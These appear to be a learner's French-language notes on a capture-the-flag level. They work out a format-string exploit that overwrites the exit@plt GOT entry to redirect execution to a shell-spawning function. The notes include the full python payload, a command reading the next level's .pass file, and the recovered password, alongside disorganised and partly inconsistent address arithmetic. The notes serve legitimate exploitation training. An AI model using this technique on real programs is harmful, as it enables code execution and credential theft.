
printf adrr = 0x8048380 = \x80\x83\x04\x08 

mon print est a +4 de 200 donc a 4 classic

premierre condition a modif = 0x804984c = │0x8048427 <__do_global_dtors_aux+7>     cmpb   $0x0,0x804984c          = \x4c\x98\x04\x08        
                                                                                                    │
v0 = 0x8049850 = eax


changer l adresse de dtor end  /// ou changer dtor_idx_6161 en negatif 

changer la condition pour que elle soit == 0
ensuite il faut changer la redirection du jump du compare vers le call de notre function o
set variable;

call exit = 0xe8    0xcc    0xfe    0xff    0xff 

0x100909a8 - 0x80484a5 

call ret= 269027752 new = 0x10090a07 = 269027847 new = 269027849
function o = 134513829
diff = 134513923


269027752 - 134513829 = 134513923 = 94


134513923 - 134513829 = 94

temp  + 134514017

0x8048503

0x8048505

0x8048504 - 0x80484a4 = 0x60
134513924 - 134513828 

set variable *(long*)0x8048500=-96

\x00\x85\x04\x08

FFA0

0x80484ff
232 

x 0x80484c2 = 0x81e58955

0x81e58955 - 0x80484c2 = 0x79E10493



change dtor list en raoutant -1 
ensuite add le pointer de function sur _DTOR_LIST__[v0 + 1]



outils:
	https://hex-works.com/

observations:
	Il y a une fonction <o> qui execute "/bin/sh"
	Probablement modifier la stack de printf pour changer son adresse de retour vu que nous n'avons pas d'insttuction de retour
	dans les autres fonctions (ca va etre fastidieux)
	Appel a fonction <exit> et fonction <_exit>

strategie:
	modifier l'operation de saut de la fonction d'appel cour <exit> pour pointer vers la fonction <o> 		

cmd gdb:
	p o
	 `-> $9 = {<text variable, no debug info>} 0x80484a4 <o>
	info address exit@plt
	 |-> Symbol "exit@plt" is at 0x80483d0 in a file compiled without debugging.
	 |
	 `-> La premiere ligne de la fonction ressemble a ca : (jmp *0x8049838)


solution:
	Je vais modifier l'adresse a laquelle l'operation jmp va dans la memoire pour pointer vers l'adresse de la fonction <o>

cmd:
	(python -c "print('\x38\x98\x04\x08' + 'A'*4 + '\x39\x98\x04\x08' + 'A'*4 + '\x3a\x98\x04\x08' + '%8.x'*3 + 'A'*120 + '%n' + '%992.x' + '%n' + '%896.x' + '%n')"; echo "cat /home/user/level6/.pass") | ./level5

pass:
	d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
